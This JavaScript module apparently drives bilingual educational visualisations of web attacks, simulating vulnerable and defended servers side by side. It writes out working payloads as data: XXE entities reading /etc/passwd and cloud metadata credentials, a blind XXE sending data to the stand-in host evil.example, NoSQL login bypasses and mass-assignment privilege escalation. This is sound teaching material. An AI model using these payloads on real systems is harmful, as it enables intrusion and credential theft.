// Logic for the second batch of server-side visuals. Pure functions, unit-tested.
const L = (en, zh) => ({ en, zh });

/* ───────────────────────── XXE ───────────────────────── */
const PASSWD = 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/usr/sbin:/usr/sbin/nologin';
const CREDS = '{"AccessKeyId":"ASIA…EXAMPLE","SecretAccessKey":"wJal…EXAMPLEKEY","Token":"IQoJ…"}';
const META = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role';
const wrap = (doctype, id) => `<?xml version="1.0"?>\n${doctype ? doctype + '\n' : ''}<stockCheck>\n  <productId>${id}</productId>\n  <storeId>1</storeId>\n</stockCheck>`;

export const XXE_DEFENCES = {
  none: L('Default parser', '默认解析器'),
  nodtd: L('DOCTYPE disallowed', '禁止 DOCTYPE'),
  both: L('DOCTYPE disallowed + XInclude off', '禁止 DOCTYPE + 关闭 XInclude'),
};

export const XXE_PRESETS = [
  { id: 'normal', label: L('Normal request', '正常请求'), body: wrap('', '3') },
  { id: 'file', label: L('Read a file', '读取文件'), body: wrap('<!DOCTYPE s [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '&xxe;') },
  { id: 'ssrf', label: L('SSRF to metadata', 'SSRF 访问元数据'), body: wrap(`<!DOCTYPE s [ <!ENTITY xxe SYSTEM "${META}"> ]>`, '&xxe;') },
  { id: 'blind', label: L('Blind, out of band', '盲注，带外'), body: wrap('<!DOCTYPE s [ <!ENTITY % ext SYSTEM "http://evil.example/x.dtd"> %ext; ]>', '3') },
  { id: 'xinclude', label: 'XInclude', body: 'productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1' },
];

/** What the XML parser does with each request. */
export function parseXxe(id, defence) {
  const s = [];
  const res = (response, outcome, oob = []) => ({ steps: s, response, outcome, oob });
  if (id === 'normal') {
    s.push({ kind: 'info', text: L('No DOCTYPE. Parse <productId>3</productId>.', '没有 DOCTYPE。解析 <productId>3</productId>。') });
    return res('HTTP/1.1 200 OK\n\n312 units', 'normal');
  }
  if (id === 'xinclude') {
    s.push({ kind: 'info', text: L('You only control one value. The server pastes it into its own XML document.', '你只能控制一个值。服务器把它贴进自己的 XML 文档里。') });
    s.push({ kind: 'info', text: L('There is no DOCTYPE to reject, so that check never fires.', '这里根本没有 DOCTYPE，那项检查不会触发。') });
    if (defence === 'both') {
      s.push({ kind: 'good', text: L('XInclude processing is off: <xi:include> stays an ordinary element.', 'XInclude 处理已关闭：<xi:include> 只是一个普通元素。') });
      return res('HTTP/1.1 400 Bad Request\n\nInvalid product ID', 'blocked');
    }
    s.push({ kind: 'bad', text: L('XInclude is on: the parser replaces <xi:include> with the text of file:///etc/passwd.', 'XInclude 已开启：解析器用 file:///etc/passwd 的内容替换 <xi:include>。') });
    return res(`HTTP/1.1 400 Bad Request\n\nInvalid product ID: ${PASSWD}`, 'pwned');
  }
  s.push({ kind: 'info', text: L('Found a DOCTYPE with an entity definition.', '发现一个带实体定义的 DOCTYPE。') });
  if (defence !== 'none') {
    s.push({ kind: 'good', text: L('DOCTYPE is disallowed, so parsing stops here.', '禁止 DOCTYPE，解析到此为止。') });
    return res('HTTP/1.1 400 Bad Request\n\nDOCTYPE is disallowed', 'blocked');
  }
  if (id === 'blind') {
    s.push({ kind: 'bad', text: L('Parameter entity %ext; → fetch http://evil.example/x.dtd', '参数实体 %ext; → 获取 http://evil.example/x.dtd') });
    s.push({ kind: 'bad', text: L('The fetched DTD defines %file (file:///etc/hostname) and an entity whose URL contains it.', '取回的 DTD 定义了 %file（file:///etc/hostname），以及一个 URL 里包含它的实体。') });
    s.push({ kind: 'bad', text: L('Expanding it makes the server request http://evil.example/?d=shop-web-01', '展开后，服务器去请求 http://evil.example/?d=shop-web-01') });
    s.push({ kind: 'info', text: L('The response itself shows nothing unusual.', '响应本身看不出任何异常。') });
    return res('HTTP/1.1 200 OK\n\n312 units', 'pwned', ['GET /x.dtd  from shop.example', 'GET /?d=shop-web-01  from shop.example']);
  }
  const uri = id === 'file' ? 'file:///etc/passwd' : META;
  s.push({ kind: 'bad', text: L(`External entity xxe → fetch ${uri}`, `外部实体 xxe → 获取 ${uri}`) });
  s.push({ kind: 'bad', text: L('&xxe; in <productId> is replaced by what came back.', '<productId> 里的 &xxe; 被替换成取回的内容。') });
  s.push({ kind: 'info', text: L('The app looks up that product ID, fails, and echoes it in the error.', '应用用这个商品 ID 去查询，失败了，并在错误信息里把它原样带了回来。') });
  return res(`HTTP/1.1 400 Bad Request\n\nInvalid product ID: ${id === 'file' ? PASSWD : CREDS}`, 'pwned');
}

/* ───────────────────────── NoSQL injection ───────────────────────── */
export const NOSQL_USERS = [
  { username: 'admin', password: 'x9!Kq2vB7' },
  { username: 'wiener', password: 'peter' },
  { username: 'carlos', password: 'montana' },
];

export const NOSQL_PRESETS = [
  { id: 'normal', label: L('Normal login', '正常登录'), body: '{"username":"wiener","password":"peter"}' },
  { id: 'wrong', label: L('Wrong password', '密码错误'), body: '{"username":"admin","password":"guess"}' },
  { id: 'ne', label: '$ne', body: '{"username":"admin","password":{"$ne":""}}' },
  { id: 'regex', label: '$regex', body: '{"username":{"$regex":"^car"},"password":{"$ne":""}}' },
  { id: 'gt', label: '$gt', body: '{"username":{"$gt":""},"password":{"$gt":""}}' },
];

export const NOSQL_DEFENCES = {
  none: L('Body passed straight to findOne', '请求体直接传给 findOne'),
  cast: L('Both fields must be strings', '两个字段都必须是字符串'),
};

/** Does one stored value match one query condition? Returns { ok, why }. */
export function matchField(value, cond) {
  if (typeof cond !== 'object' || cond === null) return { ok: value === cond, why: `${JSON.stringify(value)} === ${JSON.stringify(cond)}` };
  const [op, arg] = Object.entries(cond)[0] ?? [];
  if (op === '$ne') return { ok: value !== arg, why: `${JSON.stringify(value)} != ${JSON.stringify(arg)}` };
  if (op === '$gt') return { ok: value > arg, why: `${JSON.stringify(value)} > ${JSON.stringify(arg)}` };
  if (op === '$regex') {
    let re;
    try {
      re = new RegExp(arg);
    } catch {
      return { ok: false, why: 'bad regex' };
    }
    return { ok: re.test(value), why: `${JSON.stringify(value)} =~ /${arg}/` };
  }
  return { ok: false, why: `unknown operator ${op}` };
}

/** Run the login query. */
export function nosqlLogin(body, defence) {
  let q;
  try {
    q = JSON.parse(body);
  } catch {
    return { error: L('Body is not valid JSON', '请求体不是合法的 JSON'), rows: [] };
  }
  if (typeof q !== 'object' || q === null) return { error: L('Body must be a JSON object', '请求体必须是 JSON 对象'), rows: [] };
  if (defence === 'cast' && (typeof q.username !== 'string' || typeof q.password !== 'string')) {
    return { error: L('400: username and password must be strings', '400：username 和 password 必须是字符串'), rows: [] };
  }
  const rows = NOSQL_USERS.map((u) => {
    const user = matchField(u.username, q.username);
    const pass = matchField(u.password, q.password);
    return { username: u.username, user, pass, ok: user.ok && pass.ok };
  });
  const hit = rows.find((r) => r.ok);
  return { rows, login: hit?.username ?? null, injected: rows.some((r) => r.ok) && (typeof q.username === 'object' || typeof q.password === 'object') };
}

/* ───────────────────────── mass assignment ───────────────────────── */
export const MA_USER = { id: 42, username: 'wiener', email: 'wiener@shop.example', isAdmin: false, credit: 0 };
export const MA_PRIVILEGED = ['id', 'isAdmin', 'credit'];
export const MA_PRESETS = [
  { id: 'normal', label: L('Change email', '修改邮箱'), body: '{"email":"w@new.example"}' },
  { id: 'admin', label: L('+ "isAdmin": true', '+ "isAdmin": true'), body: '{"email":"w@new.example","isAdmin":true}' },
  { id: 'credit', label: L('+ "credit": 5000', '+ "credit": 5000'), body: '{"credit":5000}' },
  { id: 'id', label: L('+ "id": 1', '+ "id": 1'), body: '{"id":1,"email":"w@new.example"}' },
];
export const MA_MODES = {
  spread: L('Object.assign(user, req.body)', 'Object.assign(user, req.body)'),
  allow: L('Copy only email and username', '只复制 email 和 username'),
};

/** PATCH /api/users/me with a JSON body. */
export function massAssign(body, mode) {
  let b;
  try {
    b = JSON.parse(body);
  } catch {
    return { error: L('Body is not valid JSON', '请求体不是合法的 JSON') };
  }
  if (typeof b !== 'object' || b === null || Array.isArray(b)) return { error: L('Body must be a JSON object', '请求体必须是 JSON 对象') };
  const after = { ...MA_USER };
  const fields = Object.keys(b).map((k) => {
    const allowed = mode === 'spread' || ['email', 'username'].includes(k);
    if (allowed) after[k] = b[k];
    return { key: k, value: b[k], applied: allowed, privileged: MA_PRIVILEGED.includes(k) };
  });
  return { after, fields, escalated: fields.some((f) => f.applied && f.privileged) };
}

/* ───────────────────────── business logic: the checkout ───────────────────────── */
export const ITEMS = { phones: { name: L('Studio headphones', '录音室耳机'), cents: 129900 }, cable: { name: L('USB cable', 'USB 数据线'), cents: 999 } };
export const CREDIT = 10000;
export const COUPONS = { SAVE15: 0.15, WELCOME10: 0.1 };
export const LOGIC_ATTACKS = {
  normal: L('Just buy it', '正常购买'),
  negative: L('Negative quantity', '负数数量'),
  price: L('Send my own price', '自己填价格'),
  coupons: L('Alternate two coupons', '交替使用两张优惠券'),
};
export const LOGIC_CHECKS = {
  qty: L('Quantity must be 1 or more', '数量必须 ≥ 1'),
  price: L('Price looked up on the server', '价格由服务器查询'),
  coupon: L('Each coupon once per order', '每张优惠券每单只能用一次'),
};

/** Build the order the attacker submits, then apply the server's checks. Money in cents. */
export function checkout(attack, checks) {
  const lines = [];
  const notes = [];
  const add = (item, qty, sentCents) => {
    const unit = checks.price || sentCents == null ? ITEMS[item].cents : sentCents;
    if (checks.qty && qty < 1) {
      notes.push({ kind: 'good', text: L(`Rejected quantity ${qty}`, `拒绝数量 ${qty}`) });
      return;
    }
    if (sentCents != null) notes.push(checks.price ? { kind: 'good', text: L(`Ignored price=${sentCents} from the client`, `忽略了客户端发来的 price=${sentCents}`) } : { kind: 'bad', text: L(`Trusted price=${sentCents} from the request`, `相信了请求里的 price=${sentCents}`) });
    lines.push({ name: ITEMS[item].name, qty, unit, cents: unit * qty });
  };
  add('phones', 1, attack === 'price' ? 1 : null);
  if (attack === 'negative') {
    add('cable', -121);
    if (!checks.qty) notes.push({ kind: 'bad', text: L('Accepted quantity -121: the line total is negative', '接受了数量 -121：这一行的小计是负数') });
  }
  let total = lines.reduce((a, l) => a + l.cents, 0);
  const discounts = [];
  if (attack === 'coupons') {
    const base = total;
    const used = new Set();
    let last = null;
    for (const code of ['SAVE15', 'WELCOME10', 'SAVE15', 'WELCOME10', 'SAVE15', 'WELCOME10', 'SAVE15', 'WELCOME10']) {
      if (total <= 0) break;
      if (checks.coupon ? used.has(code) : last === code) {
        notes.push({ kind: 'good', text: L(`${code} already used`, `${code} 已经用过`) });
        continue;
      }
      const off = Math.min(total, Math.round(base * COUPONS[code]));
      total -= off;
      used.add(code);
      last = code;
      discounts.push({ code, cents: -off });
    }
    if (discounts.length > 2) notes.push({ kind: 'bad', text: L('The server only checked that the same coupon was not applied twice in a row', '服务器只检查了同一张券不能连续用两次') });
  }
  const ok = total >= 0 && total <= CREDIT;
  if (total < 0) notes.push({ kind: 'good', text: L('A negative total is rejected', '总价为负数，被拒绝') });
  return { lines, discounts, total, ok, notes, cheated: ok && attack !== 'normal' };
}

/* ───────────────────────── information disclosure ───────────────────────── */
export const PROBES = [
  {
    id: 'error',
    req: 'GET /product?productId=abc',
    dev: { res: 'HTTP/1.1 500\n\njava.lang.NumberFormatException: For input string: "abc"\n  at …\nApache Struts 2.3.31', loot: L('Framework and exact version: Apache Struts 2.3.31, which has a public remote code execution bug (CVE-2017-5638)', '框架和精确版本号：Apache Struts 2.3.31，它有一个公开的远程代码执行漏洞（CVE-2017-5638）') },
    prod: { res: 'HTTP/1.1 400\n\nInvalid product ID' },
  },
  {
    id: 'comment',
    req: 'GET /  (view source)',
    dev: { res: '<!-- TODO: remove before launch: /cgi-bin/phpinfo.php -->', loot: L('A hidden debug page, mentioned in an HTML comment', 'HTML 注释里提到的一个隐藏调试页面') },
    prod: { res: '<!doctype html>…  (no comments in the build)' },
  },
  {
    id: 'phpinfo',
    req: 'GET /cgi-bin/phpinfo.php',
    dev: { res: 'HTTP/1.1 200\n\nPHP Version 7.4…\nSECRET_KEY  9f2c…e71a', loot: L('SECRET_KEY from the environment, which signs session cookies', '环境变量里的 SECRET_KEY，用来给会话 Cookie 签名') },
    prod: { res: 'HTTP/1.1 404 Not Found' },
  },
  {
    id: 'backup',
    req: 'GET /backup/Product.java.bak',
    dev: { res: 'HTTP/1.1 200\n\nconn = connect("postgres", "shop", "Pg-5ecret-2024");', loot: L('A database password in a source backup', '源码备份文件里的数据库密码') },
    prod: { res: 'HTTP/1.1 404 Not Found' },
  },
  {
    id: 'git',
    req: 'GET /.git/HEAD',
    dev: { res: 'HTTP/1.1 200\n\nref: refs/heads/main', loot: L('An exposed .git folder: the whole source history can be downloaded', '暴露的 .git 目录：整个源码历史都能下载') },
    prod: { res: 'HTTP/1.1 404 Not Found' },
  },
  {
    id: 'trace',
    req: 'TRACE /admin',
    dev: { res: 'HTTP/1.1 200\n\nTRACE /admin HTTP/1.1\nX-Custom-IP-Authorization: 203.0.113.7', loot: L('A header the proxy adds for access control, which you can now send yourself', '代理为访问控制添加的一个请求头，现在你可以自己伪造它') },
    prod: { res: 'HTTP/1.1 405 Method Not Allowed' },
  },
];
export const INFO_MODES = { dev: L('Debug settings left on', '调试配置没关'), prod: L('Production settings', '生产环境配置') };

export function recon(mode) {
  return PROBES.map((p) => ({ id: p.id, req: p.req, res: p[mode].res, loot: p[mode].loot ?? null }));
}

/* ───────────────────────── web cache deception ───────────────────────── */
export const CD_ACTORS = [
  { id: 'atk', label: L('Attacker', '攻击者'), sub: 'evil.example', tone: 'red' },
  { id: 'vic', label: L('Victim', '受害者'), sub: L('logged in', '已登录'), tone: 'green' },
  { id: 'cache', label: L('Cache (CDN)', '缓存（CDN）'), sub: 'shop.example', tone: 'blue' },
  { id: 'origin', label: L('Origin', '源站'), sub: L('app server', '应用服务器'), tone: 'neutral' },
];
export const CD_PRESETS = [
  { id: 'normal', label: '/my-account', path: '/my-account' },
  { id: 'mapping', label: '/my-account/x.css', path: '/my-account/x.css' },
  { id: 'semi', label: '/my-account;x.css', path: '/my-account;x.css' },
  { id: 'enc', label: '/my-account%23x.css', path: '/my-account%23x.css' },
];
export const CD_ORIGIN = { loose: L('Lenient routing', '宽松路由'), strict: L('Exact routes only', '只匹配精确路由') };
export const CD_CACHE = { ext: L('Cache by file extension', '按扩展名缓存'), respect: L('Obey Cache-Control from origin', '遵守源站的 Cache-Control') };

/** Which page does the origin serve for this path? */
export function originRoute(path, origin) {
  if (path === '/my-account') return { page: 'account', why: L('Exact match', '精确匹配') };
  if (origin === 'strict') return { page: null, why: L('No route matches → 404', '没有匹配的路由 → 404') };
  if (path.startsWith('/my-account/')) return { page: 'account', why: L('Extra path segments are ignored by the route /my-account/*', '路由 /my-account/* 忽略了多余的路径段') };
  if (path.startsWith('/my-account;')) return { page: 'account', why: L('";" starts a path parameter, so the path is /my-account', '";" 之后是路径参数，所以路径是 /my-account') };
  if (path.startsWith('/my-account%23')) return { page: 'account', why: L('Decodes %23 to # and stops there', '把 %23 解码成 # 并在此截断') };
  return { page: null, why: L('No route', '没有路由') };
}

const M = (from, to, label, note, kind = 'normal', code = '') => ({ from, to, label, note, kind, code });

/** Message list for the attack. */
export function deception(presetId, origin, cache) {
  const path = CD_PRESETS.find((p) => p.id === presetId).path;
  const m = [];
  const cacheable = /\.(css|js)$/.test(path);
  const route = originRoute(path, origin);
  m.push(M('atk', 'vic', L('Link in a message', '消息里的链接'), L(`The attacker gets the victim to open https://shop.example${path}`, `攻击者诱使受害者打开 https://shop.example${path}`), presetId === 'normal' ? 'normal' : 'attack'));
  m.push(M('vic', 'cache', `GET ${path}`, L(`Cache key: ${path}. ${cacheable ? 'It ends in .css, so the cache treats it as a static file.' : 'Not a static file extension.'}`, `缓存键：${path}。${cacheable ? '以 .css 结尾，缓存把它当成静态文件。' : '不是静态文件扩展名。'}`), 'normal', `GET ${path}\nHost: shop.example\nCookie: session=victim…`));
  m.push(M('cache', 'origin', 'MISS → forward', L('Nothing cached yet, so the request goes to the origin with the victim’s cookie.', '还没有缓存，请求带着受害者的 Cookie 转发给源站。')));
  const body = route.page ? 'HTTP/1.1 200 OK\nCache-Control: no-store\n\n<h1>wiener</h1> API key: 8Ks0…Q2' : 'HTTP/1.1 404 Not Found';
  m.push(M('origin', 'cache', route.page ? L('200 account page', '200 账户页面') : '404', route.why, route.page ? 'normal' : 'secure', body));
  const stored = !!route.page && cacheable && cache === 'ext';
  if (route.page && cacheable && cache === 'respect') m.push(M('cache', 'cache', L('no-store → not cached', 'no-store → 不缓存'), L('The origin marked the page private, and this cache obeys that.', '源站把页面标记为不可缓存，而这个缓存遵守了这一点。'), 'secure'));
  else if (stored) m.push(M('cache', 'cache', L('Stored as public', '作为公共内容存储'), L('The cache rule matched ".css" and ignored the origin’s no-store.', '缓存规则匹配了 ".css"，忽略了源站的 no-store。'), 'attack'));
  m.push(M('cache', 'vic', route.page ? L('Account page', '账户页面') : '404', L('The victim sees a normal page and suspects nothing.', '受害者看到一个正常的页面，毫无察觉。')));
  if (presetId === 'normal') return { messages: m, outcome: 'normal' };
  m.push(M('atk', 'cache', `GET ${path}`, L('The attacker requests the same URL, without any cookie.', '攻击者请求同一个 URL，不带任何 Cookie。'), 'attack', `GET ${path}\nHost: shop.example`));
  if (stored) {
    m.push(M('cache', 'atk', L('HIT: victim’s page', 'HIT：受害者的页面'), L('The cache returns the victim’s account page, API key included.', '缓存返回了受害者的账户页面，连同 API 密钥。'), 'attack', 'HTTP/1.1 200 OK\nX-Cache: hit\n\n<h1>wiener</h1> API key: 8Ks0…Q2'));
    return { messages: m, outcome: 'pwned' };
  }
  m.push(M('cache', 'atk', route.page ? L('MISS: login page', 'MISS：登录页面') : '404', L('Nothing was cached, so the attacker only gets what an anonymous visitor would.', '没有任何内容被缓存，攻击者只能拿到匿名访客能看到的东西。'), 'secure'));
  return { messages: m, outcome: 'blocked' };
}
